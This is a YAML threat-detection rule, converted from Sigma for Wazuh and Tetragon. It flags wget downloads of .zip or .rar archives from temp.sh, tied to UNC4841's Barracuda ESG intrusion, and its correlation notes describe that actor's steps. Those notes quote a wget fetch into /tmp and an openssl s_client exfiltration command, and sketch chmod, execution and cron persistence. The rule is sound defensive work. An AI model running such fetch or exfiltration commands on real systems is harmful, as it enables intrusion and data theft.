name: UNC4841 - Download Compressed Files From Temp.sh Using Wget
id: 60d050c4-e253-4d9a-b673-5ac100cfddfb
version: 1
schema_version: "1.0"
date: "2023-06-16"
author: Nasreddine Bencherchali (Nextron Systems)
source:
  format: sigma
  repository: SigmaHQ/sigma
  rule_id: 60d050c4-e253-4d9a-b673-5ac100cfddfb
  commit: release-20260810
  license: DRL-1.1
converted_by: Moussa Amine — sigma2copilot v0.1.0
status: experimental
type: TTP

description: >
  Detects execution of "wget" to download a ".zip" or ".rar" files from
  "temp.sh". As seen used by UNC4841 during their Barracuda ESG zero day
  exploitation. MITRE ATT&CK: T1140.

data_source:
  - Tetragon process_exec via Wazuh agent

search:
  index_pattern: "${INDEX_PATTERN}"
  size: 100
  sort:
    - timestamp: desc
  query:
    bool:
      must:
        - term:
            agent_name: "${AGENT_NAME}"
        - term:
            agent_labels_customer: "${CUSTOMER_CODE}"
        
        - wildcard:
            data_process_exec_process_binary:
              value: "*/wget"
              case_insensitive: true
        - wildcard:
            data_process_exec_process_arguments:
              value: "*https://temp.sh/*"
              case_insensitive: true
        - bool:
            should:
              - wildcard:
                  data_process_exec_process_arguments:
                    value: "*.rar"
                    case_insensitive: true
              - wildcard:
                  data_process_exec_process_arguments:
                    value: "*.zip"
                    case_insensitive: true
            minimum_should_match: 1
        # ---- end generated ----
        - range:
            timestamp:
              gte: "${START_TIME}"
              lte: "${END_TIME}"
  _source:
    - timestamp
    - agent_name
    - data_process_exec_process_binary
    - data_process_exec_process_arguments
    - data_process_exec_parent_binary
    - data_process_exec_process_uid

parameters:
  AGENT_NAME:
    description: "Target agent/host name"
    type: string
    required: true
    example: "DESKTOP-AM0HLGE"
  CUSTOMER_CODE:
    description: "Customer label for filtering"
    type: string
    required: true
    example: "lab"
  INDEX_PATTERN:
    description: "Elasticsearch index pattern"
    type: string
    required: true
    example: "wazuh-lab_*"
  START_TIME:
    description: "Query start time (ISO 8601 or relative)"
    type: datetime
    required: false
    default: "now-24h"
    example: "2026-04-08 00:00:00.000"
  END_TIME:
    description: "Query end time (ISO 8601 or relative)"
    type: datetime
    required: false
    default: "now"
    example: "2026-04-08 23:59:59.999"

how_to_implement: >
  Requires Tetragon deployed on the Linux endpoint emitting process_exec events
  (rule_groups "tetragon, process_exec"), shipped by the Wazuh agent and
  ingested into the wazuh-* indices. Tetragon records the executable in
  data_process_exec_process_binary and its arguments separately in
  data_process_exec_process_arguments. The detection looks for events where
  data_process_exec_process_binary matches '*/wget';
  data_process_exec_process_arguments matches '*https://temp.sh/*';
  data_process_exec_process_arguments matches '*.rar', among other conditions.

known_false_positives: >
  Unknown. Baseline expected activity in your environment and tune this
  detection before relying on it for automated response.

references:
  - https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally
  - https://attack.mitre.org/techniques/T1140/

response:
  message: >
    UNC4841 - Download Compressed Files From Temp.sh Using Wget detected on host
    $agent_name$. Matched data_process_exec_process_binary:
    $data_process_exec_process_binary$. Matched
    data_process_exec_process_arguments: $data_process_exec_process_arguments$.
    MITRE ATT&CK: T1140
  risk_score: 75
  severity: high
  risk_objects:
    - field: agent_name
      type: system
      score: 75
  threat_objects:
    - field: data_process_exec_process_binary
      type: other
    - field: data_process_exec_process_arguments
      type: other

tags:
  asset_type: Endpoint
  mitre_attack_id:
    - T1140
  custom_tags:
    - unc4841
    - download
    - compressed
    - linux
    - tetragon
    - process_creation
    - stealth
    - emerging_threats
  product:
    - Wazuh
  security_domain: endpoint

graylog:
  query: data_process_exec_process_binary:/.*\/[Ww][Gg][Ee][Tt]/ AND data_process_exec_process_arguments:/.*[Hh][Tt][Tt][Pp][Ss]:\/\/[Tt][Ee][Mm][Pp]\.[Ss][Hh]\/.*/ AND (data_process_exec_process_arguments:/.*\.[Rr][Aa][Rr]/ OR data_process_exec_process_arguments:/.*\.[Zz][Ii][Pp]/)

correlation:
  # Authored per-rule (behaviour-researched) for the correlation engine. Related CoPilot
  # Searches + telemetry pivots to run around an alert, scoped to its host/user/ip/domain.
  related_rules:
  - id: f6a711f3-d032-4f9e-890b-bbe776236c84
    name: UNC4841 - Potential SEASPY Execution
    reason: The payload inside the archive this rule just pulled. UNC4841 staged the SEASPY backdoor (running as BarracudaMailService / resize2fstab / resize_reisertab) as a compressed drop; this rule is the fetch, SEASPY execution is the detonation of the archive's contents - the single strongest confirmation the temp.sh download was a backdoor install, not a benign pull. Same intrusion, literal next step.
  - id: 23835beb-ec38-4e74-a5d4-b99af6684e91
    name: UNC4841 - Download Tar File From Untrusted Direct IP Via Wget
    reason: The same actor's other wget ingress method - a .tar pulled from a raw public IP with --no-check-certificate. UNC4841 staged payloads from both temp.sh and direct IPs on the same compromised ESG appliance, so the two wget fetches co-firing on one host corroborates a hands-on UNC4841 operator rather than a single odd download.
  - id: 60911c07-f989-4362-84af-c609828ef829
    name: UNC4841 - SSL Certificate Exfiltration Via Openssl
    reason: The campaign's objective and C2 channel. Once the backdoor from this archive runs, UNC4841 used 'openssl s_client -quiet -connect <ip>:443|8080' to exfiltrate certificates and tunnel C2; its appearance on the same host closes the loop from ingress (this fetch) to the espionage goal and marks the intrusion as active hands-on-keyboard.
  - id: a2d9e2f3-0f43-4c7a-bcd9-9acfc0d723aa
    name: Suspicious Download and Execute Pattern via Curl/Wget
    reason: The generic download->stage->execute escalation of this very fetch. If the operator chained the temp.sh pull straight into 'sh -c' execution from /tmp or /dev/shm, this rule fires on the same wget invocation family - evidence the download was immediately weaponised rather than left on disk.
  - id: cf610c15-ed71-46e1-bdf8-2bd1a99de6c4
    name: Download File To Potentially Suspicious Directory Via Wget
    reason: 'The same wget ingress caught by its output path: cf610c15 matches ''wget -O/--output-document'' writing into /tmp. A single ''wget -O /tmp/x.zip https://temp.sh/...zip'' trips both this rule and that one, so co-firing pins the archive''s on-disk staging location - exactly where to hunt the decompression next.'
  - id: 6419afd1-3742-47a5-a7e6-b50386cd15f8
    name: Chmod Targeting Sensitive Directories
    reason: The make-executable step after the archive is unpacked. A .zip/.rar payload is inert until decompressed and chmod'd; a chmod against a file in /tmp (or /etc, /opt) right after this fetch is the clearest signal the dropped backdoor is being staged to run (T1222.002).
  - id: 312b42b1-bded-4441-8b58-163a3af58775
    name: Potentially Suspicious Execution From Tmp Folder
    reason: 'The payoff: a binary whose own path is under /tmp/ executes - the decompressed ELF backdoor actually running. Turns ''a compressed archive was downloaded'' into ''its contents ran'', confirming the end-to-end download->unpack->execute chain completed on the host.'
  - id: 6b14bac8-3e3a-4324-8109-42f0546a347f
    name: Scheduled Cron Task/Job - Linux
    reason: Persistence for the unpacked payload. UNC4841 backdoors survived reboots; crontab installing a job that references a file in /tmp - where the archive was unpacked - is a classic Linux persistence anchor established right after the backdoor first runs (T1053.003).
  window: 2h
  enrichment_searches:
  # Behaviour-targeted hunts the engine runs around the alert (not a sweep).
  - name: Archive decompression / extraction on this host (unpacking the downloaded .zip/.rar)
    query: data_process_exec_process_binary:/.*(\/[Uu][Nn][Zz][Ii][Pp]|\/[Uu][Nn][Rr][Aa][Rr]|\/[Uu][Nn][Aa][Rr]|\/7[Zz]|\/7[Zz][Aa]|\/7[Zz][Rr]|\/[Tt][Aa][Rr]|\/[Gg][Uu][Nn][Zz][Ii][Pp]|\/[Gg][Zz][Ii][Pp]|\/[Bb][Uu][Nn][Zz][Ii][Pp]2|\/[Bb][Zz][Ii][Pp]2|\/[Uu][Nn][Xx][Zz]|\/[Xx][Zz]|\/[Zz][Cc][Aa][Tt])/
    pivot_on:
    - host
    window: 1h
  - name: Execute bit set via chmod on a file in a staging / home directory
    query: data_process_exec_process_binary:/.*\/[Cc][Hh][Mm][Oo][Dd]/ AND (data_process_exec_process_arguments:/.*\/[Tt][Mm][Pp]\/.*/ OR data_process_exec_process_arguments:/.*\/[Vv][Aa][Rr]\/[Tt][Mm][Pp]\/.*/ OR data_process_exec_process_arguments:/.*\/[Dd][Ee][Vv]\/[Ss][Hh][Mm]\/.*/ OR data_process_exec_process_arguments:/.*\/[Hh][Oo][Mm][Ee]\/.*/)
    pivot_on:
    - host
    window: 1h
  - name: Execution of a dropped binary or script from a staging directory (the payload runs)
    query: data_process_exec_process_binary:/\/[Tt][Mm][Pp]\/.*/ OR data_process_exec_process_binary:/\/[Vv][Aa][Rr]\/[Tt][Mm][Pp]\/.*/ OR data_process_exec_process_binary:/\/[Dd][Ee][Vv]\/[Ss][Hh][Mm]\/.*/ OR ((data_process_exec_process_binary:/.*(\/[Bb][Aa][Ss][Hh]|\/[Ss][Hh]|\/[Dd][Aa][Ss][Hh]|\/[Pp][Yy][Tt][Hh][Oo][Nn]|\/[Pp][Yy][Tt][Hh][Oo][Nn]3|\/[Pp][Ee][Rr][Ll])/) AND (data_process_exec_process_arguments:/.*\/[Tt][Mm][Pp]\/.*/ OR data_process_exec_process_arguments:/.*\/[Vv][Aa][Rr]\/[Tt][Mm][Pp]\/.*/ OR data_process_exec_process_arguments:/.*\/[Dd][Ee][Vv]\/[Ss][Hh][Mm]\/.*/))
    pivot_on:
    - host
    window: 2h
  - name: Persistence established on this host (cron / systemd / init.d / rc.local / shell profiles / authorized_keys)
    query: (data_process_exec_process_binary:/.*(\/[Cc][Rr][Oo][Nn][Tt][Aa][Bb]|\/[Ss][Yy][Ss][Tt][Ee][Mm][Cc][Tt][Ll]|\/[Aa][Tt]|\/[Uu][Pp][Dd][Aa][Tt][Ee]-[Rr][Cc]\.[Dd])/) OR data_process_exec_process_arguments:/.*\/[Ee][Tt][Cc]\/[Cc][Rr][Oo][Nn].*/ OR data_process_exec_process_arguments:/.*\/[Ee][Tt][Cc]\/[Ss][Yy][Ss][Tt][Ee][Mm][Dd]\/.*/ OR data_process_exec_process_arguments:/.*\/[Ee][Tt][Cc]\/[Ii][Nn][Ii][Tt]\.[Dd]\/.*/ OR data_process_exec_process_arguments:/.*[Rr][Cc]\.[Ll][Oo][Cc][Aa][Ll].*/ OR data_process_exec_process_arguments:/.*\.[Bb][Aa][Ss][Hh][Rr][Cc].*/ OR data_process_exec_process_arguments:/.*[Aa][Uu][Tt][Hh][Oo][Rr][Ii][Zz][Ee][Dd]_[Kk][Ee][Yy][Ss].*/
    pivot_on:
    - host
    window: 4h
  - name: Further ingress of compressed stages via download tooling (more temp.sh-style pulls)
    query: (data_process_exec_process_binary:/.*(\/[Ww][Gg][Ee][Tt]|\/[Cc][Uu][Rr][Ll]|\/[Tt][Ff][Tt][Pp]|\/[Ff][Tt][Pp]|\/[Ss][Cc][Pp])/) AND (data_process_exec_process_arguments:/.*\.[Zz][Ii][Pp].*/ OR data_process_exec_process_arguments:/.*\.[Rr][Aa][Rr].*/ OR data_process_exec_process_arguments:/.*\.[Tt][Aa][Rr].*/ OR data_process_exec_process_arguments:/.*\.[Gg][Zz].*/ OR data_process_exec_process_arguments:/.*\.[Tt][Gg][Zz].*/ OR data_process_exec_process_arguments:/.*\.7[Zz].*/)
    pivot_on:
    - host
    window: 2h
